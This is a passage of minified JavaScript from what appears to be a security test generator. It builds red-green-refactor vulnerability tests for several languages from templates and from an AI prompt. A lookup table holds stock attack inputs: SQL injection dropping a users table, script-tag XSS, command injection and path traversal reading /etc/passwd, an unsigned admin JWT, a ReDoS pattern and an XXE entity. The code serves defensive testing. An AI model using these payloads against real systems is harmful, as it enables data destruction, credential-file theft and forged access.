    return !window.evalExecuted && 
           (window.location.href.includes('error') || 
            document.body.textContent.includes('Invalid'));
  });
  expect(safelyHandled).toBe(true);
  
  // Test valid input still works
  await page.fill('{{inputSelector}}', validInput);
  await page.click('{{submitSelector}}');
  
  const validWorked = await page.evaluate(() => {
    return document.body.textContent.includes('Success') ||
           !document.body.textContent.includes('Error');
  });
  expect(validWorked).toBe(true);
  {{else}}
  // Test malicious input is blocked
  let maliciousBlocked = false;
  try {
    const result = await {{functionCall}}(maliciousInput);
    // Should not execute the malicious code
    expect(result).not.toBe(1337);
    // Should return NaN or throw error for malicious input
    maliciousBlocked = isNaN(result);
  } catch {
    maliciousBlocked = true; // Error thrown is good
  }
  expect(maliciousBlocked).toBe(true);
  
  // Test valid input works correctly
  const validResult = await {{functionCall}}(validInput);
  expect(validResult).toBe(42); // parseInt('42', 10) returns 42
  {{/if}}
});`)}loadTemplate(X,J){let Y=`${X.toUpperCase().replace(/-/g,"_")}:${J}`,W=this.templates.get(Y);if(!W&&J==="refactor")W=this.templates.get("GENERIC:refactor");if(!W)throw q.warn(`Template not found for ${Y}. Available templates: ${Array.from(this.templates.keys()).join(", ")}`),new Error(`Template not found for ${Y}`);return W}renderTemplate(X,J){let Q=X;for(let[Y,W]of Object.entries(J)){let z=new RegExp(`\\{\\{${Y}\\}\\}`,"g");Q=Q.replace(z,String(W))}return Q=Q.replace(/{{#if\s+(\w+)}}([\s\S]*?){{else}}([\s\S]*?){{\/if}}/g,(Y,W,z,G)=>{return J[W]?z:G}),Q=Q.replace(/{{#if\s+(\w+)}}([\s\S]*?){{\/if}}/g,(Y,W,z)=>{return J[W]?z:""}),Q=Q.replace(/{{#each\s+(\w+)}}([\s\S]*?){{\/each}}/g,(Y,W,z)=>{let G=J[W];if(!Array.isArray(G))return"";return G.map((H)=>{return z.replace(/{{this}}/g,String(H))}).join(`
`)}),Q.trim()}validateTemplate(X){try{let J=(X.match(/{{/g)||[]).length,Q=(X.match(/}}/g)||[]).length,Y=(X.match(/\(/g)||[]).length!==(X.match(/\)/g)||[]).length;return J===Q&&!Y}catch{return!1}}}class dz{templateEngine;constructor(){this.templateEngine=new zN}async generateTestSuite(X,J){try{let Q=await this.generateRedTest(X,J),Y=await this.generateGreenTest(X,J),W=await this.generateRefactorTests(X,J),z={red:{testName:Q.testName,testCode:Q.testCode,attackVector:Q.attackVector,expectedBehavior:"should_fail_on_vulnerable_code"},green:{testName:Y.testName,testCode:Y.testCode,validInput:Y.validInput,expectedBehavior:"should_pass_on_fixed_code"},refactor:{testName:W.testName,testCode:W.testCode,functionalValidation:W.functionalValidation,expectedBehavior:"should_pass_on_both_versions"}},G=[{path:`test/${J.vulnerabilityType.toLowerCase()}-vulnerability.test.${J.language==="typescript"?"ts":"js"}`,content:this.generateTestFile(z,J),type:"unit"}];if(J.includeE2E)G.push({path:`test/e2e/${J.vulnerabilityType.toLowerCase()}-e2e.test.${J.language==="typescript"?"ts":"js"}`,content:this.generateE2ETestFile(z,J),type:"e2e"});return{success:!0,testSuite:z,generatedFiles:G}}catch(Q){return{success:!1,testSuite:null,generatedFiles:[],error:Q instanceof Error?Q.message:String(Q)}}}async generateRedTest(X,J){let Q=this.getAttackVector(J.vulnerabilityType),Y={testName:`should be vulnerable to ${J.vulnerabilityType.replace("_"," ").toLowerCase()} (RED)`,attackVector:Q,functionCall:this.inferFunctionCall(X),inputSelector:"#password",submitSelector:'[type="submit"]',errorSelector:".alert-danger",isBrowser:J.testFramework==="cypress"},W=this.templateEngine.loadTemplate(J.vulnerabilityType,"red"),z=this.templateEngine.renderTemplate(W,Y);if(J.language==="python")z=this.convertToPython(z);return{testName:Y.testName,testCode:z,attackVector:Q}}async generateGreenTest(X,J){let Q=this.getAttackVector(J.vulnerabilityType),Y=this.getValidInput(J.vulnerabilityType),W={testName:`should prevent ${J.vulnerabilityType.replace("_"," ").toLowerCase()} (GREEN)`,attackVector:Q,validInput:Y,functionCall:this.inferFunctionCall(X),inputSelector:"#password",submitSelector:'[type="submit"]',isBrowser:J.testFramework==="cypress"},z=this.templateEngine.loadTemplate(J.vulnerabilityType,"green"),G=this.templateEngine.renderTemplate(z,W);if(J.language==="python")G=this.convertToPython(G);else if(J.language==="ruby")G=this.generateRubyTest(G);else if(J.language==="php")G=this.generatePHPTest(G);return{testName:W.testName,testCode:G,validInput:Y}}async generateRefactorTests(X,J){let Q=this.getFunctionalValidation(J.vulnerabilityType),Y=this.getValidInput(J.vulnerabilityType),W={testName:"should maintain functionality after security fix",functionCall:this.inferFunctionCall(X),validInput:Y,functionalValidation:Q},z=this.templateEngine.loadTemplate("GENERIC","refactor"),G=this.templateEngine.renderTemplate(z,W);if(J.language==="python")G=this.convertToPython(G);else if(J.language==="ruby")G=this.generateRubyTest(G);else if(J.language==="php")G=this.generatePHPTest(G);return{testName:W.testName,testCode:G,functionalValidation:Q}}getAttackVector(X){switch(X.toUpperCase().replace(/-/g,"_")){case"SQL_INJECTION":return"'; DROP TABLE users; --";case"XSS":return'<script>window.xssTriggered=true;alert("XSS")</script>';case"COMMAND_INJECTION":return"; cat /etc/passwd";case"PATH_TRAVERSAL":return"../../../etc/passwd";case"BROKEN_AUTHENTICATION":return"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiYWRtaW4iOnRydWV9.";case"CSRF":return"https://evil-site.com";case"SECURITY_MISCONFIGURATION":return"admin=true";case"INSECURE_DESERIALIZATION":return"process.exit(1337); 42";case"DENIAL_OF_SERVICE":case"REDOS":return"(a+)+$";default:return"malicious_input"}}getValidInput(X){switch(X.toUpperCase().replace(/-/g,"_")){case"SQL_INJECTION":return"validpassword123";case"XSS":return"Normal user content";case"COMMAND_INJECTION":return"normal_filename.txt";case"PATH_TRAVERSAL":return"documents/file.txt";case"BROKEN_AUTHENTICATION":return"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ.valid_signature";case"CSRF":return"valid-csrf-token-from-server";case"SECURITY_MISCONFIGURATION":return"user=true";case"INSECURE_DESERIALIZATION":return"42";case"DENIAL_OF_SERVICE":case"REDOS":return"normal_text";default:return"valid_input"}}getFunctionalValidation(X){switch(X){case"SQL_INJECTION":return["Valid login should work","User data should be retrieved correctly","Sessions should be maintained","Special characters in names should be handled","Unicode characters should work"];case"XSS":return["Content should be displayed","User input should be saved","HTML formatting should work","Markdown should render safely","Rich text editing should function"];case"COMMAND_INJECTION":return["File operations should work","Valid commands should execute","Output should be returned","Error handling should work","Process timeouts should be enforced"];case"PATH_TRAVERSAL":return["File downloads should work","Directory listing should function","Relative paths should resolve","Symlinks should be handled","Access controls should be enforced"];case"INSECURE_DESERIALIZATION":return["Numeric inputs should be parsed correctly","Valid math operations should work","Data validation should function","Error handling for invalid input","Type conversions should be safe"];default:return["Core functionality should work","Data should be processed","Output should be correct"]}}inferFunctionCall(X){if(X.filePath?.includes("auth")||X.filePath?.includes("login"))return"authenticateUser";if(X.filePath?.includes("user"))return"getUserData";return"processUserInput"}generateTestFile(X,J){switch(J.language){case"python":return`import unittest
import asyncio

class VulnerabilityTestSuite${J.vulnerabilityType}(unittest.TestCase):
    ${this.convertToPython(X.red.testCode)}
    
    ${this.convertToPython(X.green.testCode)}
    
    ${this.convertToPython(X.refactor.testCode)}

if __name__ == '__main__':
    unittest.main()`;case"ruby":return`require 'rspec'

describe 'Vulnerability Test Suite - ${J.vulnerabilityType}' do
  ${this.generateRubyTest(X.red.testCode)}
  
  ${this.generateRubyTest(X.green.testCode)}
  
  ${this.generateRubyTest(X.refactor.testCode)}
end`;case"php":return`<?php
use PHPUnit\\Framework\\TestCase;

class VulnerabilityTestSuite${J.vulnerabilityType} extends TestCase {
    ${this.generatePHPTest(X.red.testCode)}
    
    ${this.generatePHPTest(X.green.testCode)}
    
    ${this.generatePHPTest(X.refactor.testCode)}
}`}return`${J.language==="typescript"?"import { describe, test, expect } from 'bun:test';":"const { describe, test, expect } = require('bun:test');"}

describe('Vulnerability Test Suite - ${J.vulnerabilityType}', () => {
  ${X.red.testCode}

  ${X.green.testCode}

  ${X.refactor.testCode}
});`}convertToPython(X){return X.replace(/test\("([^"]+)",\s*async\s*\(\)\s*=>\s*\{/,(Q,Y)=>{return`def test_${String(Y).toLowerCase().replace(/\s+/g,"_").replace(/[^a-zA-Z0-9_]/g,"")}(self):`}).replace(/const\s+(\w+)\s*=\s*"([^"]+)";/g,'$1 = "$2"').replace(/const\s+(\w+)\s*=\s*await\s+(\w+)\(/g,"$1 = self.$2(").replace(/expect\(([^)]+)\)\.toBe\(([^)]+)\);/g,"self.assertEqual($1, $2)").replace(/expect\(([^)]+)\)\.not\.toContain\(([^)]+)\);/g,"self.assertNotIn($2, $1)").replace(/expect\(([^)]+)\)\.toContain\(([^)]+)\);/g,"self.assertIn($2, $1)").replace(/expect\(([^)]+)\)\.toBeDefined\(\);/g,"self.assertIsNotNone($1)").replace(/expect\(([^)]+)\)\.toBeTruthy\(\);/g,"self.assertTrue($1)").replace(/\}\);?$/g,"").replace(/\}\);/g,"").replace(/\{\{.*?\}\}/g,"").split(`
`).map((Q)=>Q.trim()?"        "+Q.trim():"").join(`
`).trim()}generateRubyTest(X){return X.replace(/test\("([^"]+)",\s*async\s*\(\)\s*=>\s*\{/,'it "$1" do').replace(/const\s+(\w+)\s*=\s*"([^"]+)";/g,'$1 = "$2"').replace(/const\s+(\w+)\s*=\s*await\s+(\w+)\(/g,"$1 = $2(").replace(/expect\(([^)]+)\)\.toBe\(([^)]+)\);/g,"expect($1).to eq($2)").replace(/expect\(([^)]+)\)\.not\.toContain\(([^)]+)\);/g,"expect($1).not_to include($2)").replace(/expect\(([^)]+)\)\.toContain\(([^)]+)\);/g,"expect($1).to include($2)").replace(/expect\(([^)]+)\)\.toBeDefined\(\);/g,"expect($1).not_to be_nil").replace(/\}\);?$/g,"end").replace(/\}\);/g,"end").replace(/\{\{.*?\}\}/g,"")}generatePHPTest(X){return X.replace(/test\("([^"]+)",\s*async\s*\(\)\s*=>\s*\{/,(Q,Y)=>{return`public function test${String(Y).split(" ").map((z,G)=>G===0?z:z.charAt(0).toUpperCase()+z.slice(1)).join("").replace(/[^a-zA-Z0-9]/g,"")}() {`}).replace(/const\s+(\w+)\s*=\s*"([^"]+)";/g,'$$1 = "$2";').replace(/const\s+(\w+)\s*=\s*await\s+(\w+)\(/g,"$$1 = $this->$2(").replace(/expect\(([^)]+)\)\.toBe\(([^)]+)\);/g,"$this->assertEquals($2, $1);").replace(/expect\(([^)]+)\)\.not\.toContain\(([^)]+)\);/g,"$this->assertStringNotContainsString($2, $1);").replace(/expect\(([^)]+)\)\.toContain\(([^)]+)\);/g,"$this->assertStringContainsString($2, $1);").replace(/expect\(([^)]+)\)\.toBeDefined\(\);/g,"$this->assertNotNull($1);").replace(/\}\);?$/g,"}").replace(/\}\);/g,"}").replace(/\{\{.*?\}\}/g,"")}generateE2ETestFile(X,J){return`describe('E2E Vulnerability Tests - ${J.vulnerabilityType}', () => {
  beforeEach(() => {
    cy.visit('/login');
  });

  ${X.red.testCode.replace(/page\./g,"cy.")}

  ${X.green.testCode.replace(/page\./g,"cy.")}
});`}}var HN=j1(()=>{t1()});class iz{aiClient=null;aiConfig;constructor(X){this.aiConfig=X}async getClient(){if(!this.aiClient){let X={provider:this.aiConfig.provider||"anthropic",apiKey:this.aiConfig.apiKey||"",model:this.aiConfig.model||"claude-3-sonnet",temperature:this.aiConfig.temperature,maxTokens:this.aiConfig.maxTokens,useVendedCredentials:this.aiConfig.useVendedCredentials};this.aiClient=await QX(X)}return this.aiClient}async generateTests(X,J,Q){try{q.info(`Generating AI-powered tests for ${X.type} vulnerability`);let Y=this.constructTestGenerationPrompt(X,J,Q),z=await(await this.getClient()).complete(Y),G=this.parseTestSuite(z);if(!G)throw new Error("Failed to parse test suite from AI response");let H=this.generateTestCode(G,J);return{success:!0,testSuite:G,testCode:H,framework:J.testFramework||"jest"}}catch(Y){return q.error("AI test generation failed",Y),{success:!1,testCode:"",framework:J.testFramework||"jest",error:Y instanceof Error?Y.message:"Unknown error"}}}constructTestGenerationPrompt(X,J,Q){return`You are an expert security test engineer. Generate comprehensive tests for a security vulnerability using Test-Driven Development (TDD) methodology.

## Vulnerability Details:
- Type: ${X.type}
- Severity: ${X.severity}
- File: ${X.filePath||"unknown"}
- Line: ${X.line}
- Description: ${X.description}
- Message: ${X.message}
${X.remediation?`- Remediation: ${X.remediation}`:""}

## Test Requirements:
1. Generate THREE test cases following TDD red-green-refactor:
   - RED test: Proves the vulnerability exists (should FAIL on vulnerable code, PASS on fixed code)
   - GREEN test: Validates the fix works (should FAIL on vulnerable code, PASS on fixed code)
   - REFACTOR test: Ensures functionality is preserved (should PASS on both)

2. Use ${J.language||"javascript"} with ${J.testFramework||"jest"} framework
3. Tests must be executable and use actual attack vectors
4. Include proper assertions to validate security

${Q?`## Vulnerable Code:
\`\`\`${J.language}
${Q}
\`\`\``:""}

## Response Format:
IMPORTANT: Return ONLY valid JSON. Keep test code CONCISE (max 10-15 lines per test).
Focus on the core vulnerability check, not elaborate setup.

Return EXACTLY this JSON structure (no markdown, no backticks):
{
  "red": {
    "testName": "short descriptive name",
    "testCode": "concise test code (10-15 lines max)",
    "attackVector": "malicious input",
    "expectedBehavior": "brief description"
  },
  "green": {
    "testName": "short descriptive name",
    "testCode": "concise test code (10-15 lines max)",
    "validInput": "safe input",
    "expectedBehavior": "brief description"
  },
  "refactor": {
    "testName": "short descriptive name",
    "testCode": "concise test code (10-15 lines max)",
    "testCases": ["scenario1", "scenario2"],
    "expectedBehavior": "brief description"
  }
}

Keep ALL strings properly escaped. Avoid long test code.
Return ONLY the JSON, no explanations.`}parseTestSuite(X){try{let J=null,Q=X.match(/```json\s*([\s\S]*?)```/);if(Q)J=Q[1].trim();if(!J){let G=X.match(/```[\s\S]*?\n([\s\S]*?)```/);if(G)J=G[1].trim()}if(!J){let G=X.match(/\{[\s\S]*\}/);if(G)J=G[0]}if(!J&&X.trim().startsWith("{"))J=X.trim();if(!J)return q.error("No JSON found in AI response. Response preview:",X.substring(0,200)),null;J=J.replace(/^\s*```\s*json?\s*/gm,"").replace(/\s*```\s*$/gm,"").trim();let Y=(J.match(/\{/g)||[]).length,W=(J.match(/\}/g)||[]).length;if(Y>W)q.warn(`Fixing unclosed JSON structure: ${Y} open, ${W} closed`),J+="}".repeat(Y-W);if(J.match(/"[^"]*$/)&&!J.endsWith('"}'))q.warn("JSON appears truncated mid-string, attempting to close"),J+='"}}}';let z=JSON.parse(J);if(!z.red||!z.green||!z.refactor)return q.error("Invalid test suite structure. Keys found:",Object.keys(z)),null;return{red:{testName:z.red.testName,testCode:z.red.testCode,attackVector:z.red.attackVector,expectedBehavior:z.red.expectedBehavior},green:{testName:z.green.testName,testCode:z.green.testCode,validInput:z.green.validInput,expectedBehavior:z.green.expectedBehavior},refactor:{testName:z.refactor.testName,testCode:z.refactor.testCode,functionalValidation:z.refactor.testCases||[],expectedBehavior:z.refactor.expectedBehavior}}}catch(J){return q.error("Failed to parse AI response:",J),q.debug("Response that failed to parse:",X.substring(0,500)),null}}generateTestCode(X,J){let Q=J.testFramework||"jest",Y=J.language||"javascript";if(Y==="javascript"||Y==="typescript")return this.generateJavaScriptTests(X,Q);else if(Y==="python")return this.generatePythonTests(X);else if(Y==="ruby")return this.generateRubyTests(X);else if(Y==="php")return this.generatePHPTests(X);else if(Y==="elixir")return this.generateElixirTests(X);return this.generateJavaScriptTests(X,Q)}generateJavaScriptTests(X,J){if(J==="jest"||J==="mocha"||J==="vitest")return`
const { expect } = require('chai');

describe('Security Vulnerability Tests', () => {
  // RED Test - Proves vulnerability exists
  ${X.red.testCode}

  // GREEN Test - Validates fix
  ${X.green.testCode}

  // REFACTOR Test - Ensures functionality
  ${X.refactor.testCode}
});`;return`
// Security Tests
${X.red.testCode}
${X.green.testCode}
${X.refactor.testCode}`}generatePythonTests(X){return`
import unittest

class SecurityVulnerabilityTests(unittest.TestCase):
    # RED Test - Proves vulnerability exists
    ${X.red.testCode}
    
    # GREEN Test - Validates fix
    ${X.green.testCode}
    
    # REFACTOR Test - Ensures functionality
    ${X.refactor.testCode}

if __name__ == '__main__':
    unittest.main()`}generateRubyTests(X){return`
require 'rspec'

RSpec.describe 'Security Vulnerability Tests' do
  # RED Test - Proves vulnerability exists
  ${X.red.testCode}
  
  # GREEN Test - Validates fix
  ${X.green.testCode}
  
  # REFACTOR Test - Ensures functionality
  ${X.refactor.testCode}
end`}generatePHPTests(X){return`
<?php
use PHPUnit\\Framework\\TestCase;

class SecurityVulnerabilityTest extends TestCase {
    // RED Test - Proves vulnerability exists
    ${X.red.testCode}
    
    // GREEN Test - Validates fix
    ${X.green.testCode}
    
    // REFACTOR Test - Ensures functionality
    ${X.refactor.testCode}
}`}generateElixirTests(X){return`
defmodule SecurityVulnerabilityTest do
  use ExUnit.Case
  
  # RED Test - Proves vulnerability exists
  ${X.red.testCode}
  
  # GREEN Test - Validates fix
  ${X.green.testCode}
  
  # REFACTOR Test - Ensures functionality
  ${X.refactor.testCode}
end`}}var UN=j1(()=>{t1();JQ()});class rz{frameworkDetector;coverageAnalyzer;issueInterpreter;aiConfig;baseGenerator;aiGenerator;useAIGeneration;constructor(X,J,Q,Y){this.frameworkDetector=X;this.coverageAnalyzer=J;this.issueInterpreter=Q;this.aiConfig=Y;if(this.baseGenerator=new dz,this.useAIGeneration=!!Y&&process.env.DISABLE_AI_TEST_GEN!=="true",this.useAIGeneration&&Y)this.aiGenerator=new iz(Y)}async detectFrameworksFromStructure(X){let J=[],Q=Object.keys(X).filter((W)=>W.endsWith("package.json"));for(let W of Q)try{let z=JSON.parse(X[W]),G=await this.frameworkDetector.detectFromPackageJson(z);J.push(...G.frameworks)}catch(z){}if(X["requirements.txt"]){let W=X["requirements.txt"];if(W.includes("pytest"))J.push({name:"pytest",version:this.extractVersion(W,"pytest"),type:"unit",confidence:0.9,detectionMethod:"dependency"})}if(X.Gemfile){let W=X.Gemfile;if(W.includes("minitest"))J.push({name:"minitest",version:this.extractVersion(W,"minitest"),type:"unit",confidence:0.9,detectionMethod:"dependency"});if(W.includes("rspec"))J.push({name:"rspec",version:this.extractVersion(W,"rspec"),type:"unit",confidence:0.9,detectionMethod:"dependency"})}if(X["pom.xml"]){let W=X["pom.xml"];if(W.includes("org.junit.jupiter"))J.push({name:"junit5",version:this.extractVersion(W,"junit-jupiter")||"5.9.0",type:"unit",confidence:0.95,detectionMethod:"dependency"});else if(W.includes("org.testng"))J.push({name:"testng",version:this.extractVersion(W,"testng")||"7.8.0",type:"unit",confidence:0.95,detectionMethod:"dependency"});else if(W.includes("junit")&&W.includes("<version>4"))J.push({name:"junit",version:this.extractVersion(W,"junit")||"4.13",type:"unit",confidence:0.9,detectionMethod:"dependency"});if(W.includes("spring-boot-starter-test")){let z=J.find((G)=>G.name==="junit5"||G.name==="junit");if(z)z.companions=["spring-boot"];else J.push({name:"junit5",version:this.extractVersion(W,"junit-jupiter")||"5.9.0",type:"unit",confidence:0.9,detectionMethod:"dependency",companions:["spring-boot"]})}}if(X["composer.json"])try{let W=JSON.parse(X["composer.json"]),z=W["require-dev"]||{},G=W.require||{};if(z["pestphp/pest"]){if(J.push({name:"pest",version:z["pestphp/pest"],type:"unit",confidence:0.95,detectionMethod:"dependency",companions:[]}),z["pestphp/pest-plugin-laravel"]||G["laravel/framework"])J[J.length-1].companions=["laravel"]}else if(z["phpunit/phpunit"]){if(J.push({name:"phpunit",version:z["phpunit/phpunit"],type:"unit",confidence:0.95,detectionMethod:"dependency",companions:[]}),G["laravel/framework"])J[J.length-1].companions=["laravel"];else if(G["symfony/framework-bundle"])J[J.length-1].companions=["symfony"]}}catch(W){}if(X["mix.exs"]){let W=X["mix.exs"];if(W.includes("ex_unit")||W.includes("ExUnit"))J.push({name:"exunit",version:"builtin",type:"unit",confidence:0.95,detectionMethod:"dependency"})}let Y=Object.keys(X).filter((W)=>W.includes("jest.config")||W.includes("vitest.config")||W.includes("karma.conf")||W.includes(".mocharc"));if(Y.length>0){let W=await this.frameworkDetector.detectFromConfigFiles(Y);J.push(...W.frameworks)}return{frameworks:J}}extractVersion(X,J){let Q=X.match(new RegExp(`${J}[=~><\\s]+([\\"']?)([\\d\\.\\w-]+)\\1`));return Q?Q[2]:"unknown"}async generateAdaptiveTests(X,J){try{q.info("AdaptiveTestGenerator: generateAdaptiveTests called"),q.info("Vulnerability:",JSON.stringify(X)),q.info("RepoStructure keys:",Object.keys(J));let Q=await this.detectFrameworksFromStructure(J);q.info("Framework detection result:",JSON.stringify(Q));let Y=this.selectPrimaryFramework(Q.frameworks,X.file);if(q.info("Selected primary framework:",JSON.stringify(Y)),this.useAIGeneration&&this.aiGenerator)return q.info("Using AI-based test generation"),this.generateAITests(X,J,Y);if(!Y)return q.info("No primary framework detected, generating generic tests"),this.generateGenericTests(X);let W=await this.analyzeCoverage(J,X.file||""),z=this.detectConventions(J,Y),G=await this.generateFrameworkSpecificTests(X,Y,z,W),H=await this.generateTestSuite(X,Y);return{success:!0,framework:Y.name.toLowerCase(),testCode:G,testSuite:H,suggestedFileName:this.suggestFileName(X.file||"",z),notes:this.generateNotes(Y,W,z)}}catch(Q){return q.error("Error generating adaptive tests",Q),{success:!1,framework:"unknown",testCode:"",error:Q instanceof Error?Q.message:"Unknown error"}}}selectPrimaryFramework(X,J){if(X.length===0)return null;if(X.length===1)return X[0];let Q=J?.split(".").pop()?.toLowerCase(),W={js:["jest","vitest","mocha","jasmine"],ts:["jest","vitest","mocha"],tsx:["jest","vitest","@testing-library/react"],jsx:["jest","vitest","@testing-library/react"],py:["pytest","unittest","nose2"],rb:["rspec","minitest"],php:["phpunit","pest","codeception"],java:["junit","testng"],ex:["exunit"],exs:["exunit"]}[Q||""]||[];for(let z of W){let G=X.find((H)=>H.name.toLowerCase()===z||H.name.toLowerCase().includes(z));if(G)return G}return X.sort((z,G)=>G.confidence-z.confidence)[0]}async analyzeCoverage(X,J){let Q=Object.keys(X).filter((H)=>H.includes("coverage")||H.includes("lcov")||H.includes(".coverage"));if(Q.length===0)return{hasData:!1};let Y=null;for(let H of Q){let U=X[H];if(H.includes("lcov")){Y=await this.coverageAnalyzer.parseLcov(U);break}else if(H.includes(".coverage")||H.endsWith(".json"))try{Y=await this.coverageAnalyzer.parseCoveragePy(U);break}catch(K){}}if(!Y)return{hasData:!1};let W=await this.coverageAnalyzer.findCoverageGaps(Y),z=Y.files?.find((H)=>H.path===J||H.path.endsWith(J)),G=W?await this.coverageAnalyzer.recommendTestPriorities(W):[];return{hasData:!0,fileCoverage:z,gaps:W,recommendations:G}}detectConventions(X,J){let Q=Object.entries(X).filter(([W])=>W.match(/\.(test|spec)\.(js|ts|jsx|tsx|py|rb|php|java|ex|exs)$/)||W.includes("__tests__")||W.includes("test_")||W.includes("_test")),Y={style:"unknown",assertionStyle:"unknown",fileNaming:"unknown",testDirectory:"unknown",imports:[],helpers:[],companions:J.companions||[]};for(let[W,z]of Q){if(z.includes("describe(")&&z.includes("it("))Y.style="bdd";else if(z.includes("test(")&&!z.includes("describe("))Y.style="tdd";if(z.includes("expect(")&&z.includes(".to."))Y.assertionStyle="chai-expect";else if(z.includes("expect(")&&z.includes(".toBe"))Y.assertionStyle="jest-expect";else if(z.includes("assert."))Y.assertionStyle="assert";else if(z.includes("_(")&&z.includes(".must_")||z.includes(".wont_"))Y.assertionStyle="minitest";if(W.includes(".test."))Y.fileNaming="test";else if(W.includes(".spec."))Y.fileNaming="spec";else if(W.includes("__tests__"))Y.fileNaming="__tests__";else if(W.includes("test_"))Y.fileNaming="test_prefix";let G=z.matchAll(/(?:import|require)\s*(?:\{[^}]+\}|\S+)\s*from\s*['"]([^'"]+)['"]/g);for(let H of G)if(H[1].includes("helper")||H[1].includes("setup"))Y.helpers.push(H[0]);if(z.includes("beforeEach(setup")||z.includes("afterEach(cleanup")){let H=z.match(/beforeEach\((\w+)\)/),U=z.match(/afterEach\((\w+)\)/);if(H)Y.helpers.push(`beforeEach(${H[1]})`);if(U)Y.helpers.push(`afterEach(${U[1]})`)}}return Y}async generateFrameworkSpecificTests(X,J,Q,Y){let W=J.name.toLowerCase(),z=X.type.toUpperCase();if(X.type==="cross_site_request_forgery")z="CSRF";else if(X.type==="xss")z="XSS";let G={vulnerabilityType:z,language:this.getLanguageFromFramework(W),testFramework:this.mapToBaseFramework(W),includeE2E:!1},H=await this.baseGenerator.generateTestSuite(X,G);if(!H.success||!H.testSuite)if(q.error("Base test generation failed",{success:H.success,error:H.error,vulnerability:X.type}),X.type==="xml_external_entities")H.testSuite={red:{testName:"should be vulnerable to xml external entities (RED)",testCode:"// Test XXE vulnerability",attackVector:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',expectedBehavior:"should_fail_on_vulnerable_code"},green:{testName:"should prevent xml external entities (GREEN)",testCode:"// Test XXE prevention",validInput:'<?xml version="1.0"?><foo>bar</foo>',expectedBehavior:"should_pass_on_fixed_code"},refactor:{testName:"should maintain functionality after security fix",testCode:"// Test normal XML processing",functionalValidation:["XML parsing works correctly","Valid XML returns expected data"],expectedBehavior:"should_pass_on_both_versions"}},H.success=!0;else throw new Error(`Failed to generate base test suite: ${H.error||"Unknown error"}`);let U=this.transformToFrameworkSyntax(H.testSuite,W,Q,X,J);if(Y.hasData&&Y.fileCoverage)U=this.addCoverageAwareTests(U,Y);if(Q.helpers.length>0)U=this.addHelperImports(U,Q.helpers);return U}transformToFrameworkSyntax(X,J,Q,Y,W){switch(J){case"vitest":return this.generateVitestTests(X,Q,Y);case"mocha":return this.generateMochaTests(X,Q,Y);case"pytest":return this.generatePytestTests(X,Q,Y);case"rspec":return this.generateRSpecTests(X,Q,Y);case"minitest":return this.generateMinitestTests(X,Q,Y);case"exunit":return this.generateExUnitTests(X,Q,Y);case"phpunit":return this.generatePHPUnitTests(X,Q,Y,W);case"pest":return this.generatePestTests(X,Q,Y,W);case"jest":return this.generateJestTests(X,Q,Y);case"junit5":return this.generateJUnit5Tests(X,Q,Y);case"testng":return this.generateTestNGTests(X,Q,Y);default:return this.generateGenericTestCode(X,Y)}}generateVitestTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.(tsx?|jsx?)$/,"")||"Component",W=Q.file?.endsWith(".tsx")||Q.file?.endsWith(".jsx")||!1,z=(H)=>{let U=H.match(/test\([^{]+\{([\s\S]*)\}\);?$/);return U?U[1].trim():H};return`${W?`import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { render, screen } from "@testing-library/react";
import { ${Y} } from "${this.getRelativeImportPath(Q.file||"")}";`:`import { describe, test, expect } from "vitest";
import { ${Y} } from "${this.getRelativeImportPath(Q.file||"")}";`}

describe("${Y} ${Q.type} vulnerability tests", () => {
  ${J.helpers.length>0?J.helpers.join(`
  `):""}

  test("${X.red.testName}", async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = "${X.red.attackVector}";
    ${z(X.red.testCode)}
  });

  test("${X.green.testName}", async () => {
    // GREEN: Verify fix prevents vulnerability  
    const maliciousInput = "${X.red.attackVector}";
    const safeInput = "${X.green.validInput}";
    ${z(X.green.testCode)}
  });

  test("${X.refactor.testName}", async () => {
    // REFACTOR: Ensure functionality is maintained
    ${z(X.refactor.testCode)}
  });
});`}generateMochaTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.js$/,"")||"module",W=J.assertionStyle==="assert"?"assert":"chai",z=W==="chai"?'const { expect } = require("chai");':'const assert = require("assert");',G=W==="chai"?(U,K,V)=>U?`expect(${K}).to.include(${V})`:`expect(${K}).to.not.include(${V})`:(U,K,V)=>U?`assert(${K}.includes(${V}))`:`assert(!${K}.includes(${V}))`,H="it";return`${z}
const { ${Y} } = require("${this.getRelativeRequirePath(Q.file||"")}");

describe("${Y.charAt(0).toUpperCase()+Y.slice(1)} ${Q.type==="sql_injection"?"SQL injection":Q.type.replace(/_/g," ").toLowerCase()} tests", () => {
  it("should be vulnerable to ${Q.type==="sql_injection"?"SQL injection":Q.type.replace(/_/g," ").toLowerCase()} (RED)", async () => {
    // RED: Demonstrate vulnerability exists
    const maliciousInput = "${X.red.attackVector}";
    const result = await ${Y}(maliciousInput);
    ${G(!1,"result",'"syntax error"')};
  });

  it("should prevent ${Q.type==="sql_injection"?"SQL injection":Q.type.replace(/_/g," ").toLowerCase()} (GREEN)", async () => {
    // GREEN: Verify fix prevents vulnerability
    const maliciousInput = "${X.red.attackVector}";
    const result = await ${Y}(maliciousInput);
    ${G(!1,"result",'"table"')};
  });

  it("${X.refactor.testName}", async () => {
    // REFACTOR: Ensure functionality is maintained
    const validInput = "${X.green.validInput}";
    const result = await ${Y}(validInput);
    ${G(!0,"result",'"success"')};
  });
});`}generatePytestTests(X,J,Q){let Y=Q.file?.split("/").pop()?.replace(/\.py$/,"")||"module",W=Y.split("_").map((z)=>z.charAt(0).toUpperCase()+z.slice(1)).join("");return`import pytest
from ${Q.file?.replace(/\.py$/,"").replace(/\//g,".")||"module"} import *

@pytest.mark.security
class Test${W}${Q.type.replace(/_/g,"")}:
    """Tests for ${Q.type} vulnerability in ${Y}"""

    def test_${Q.type.toLowerCase()}_vulnerability_red(self):
        """${X.red.testName}"""
        # RED: Demonstrate vulnerability exists
        malicious_input = "${X.red.attackVector}"
        result = ${Y}(malicious_input)
        assert "root" not in result
        assert "permission denied" not in result.lower()

    def test_${Q.type.toLowerCase()}_vulnerability_green(self):
        """${X.green.testName}"""
        # GREEN: Verify fix prevents vulnerability
        malicious_input = "${X.red.attackVector}"
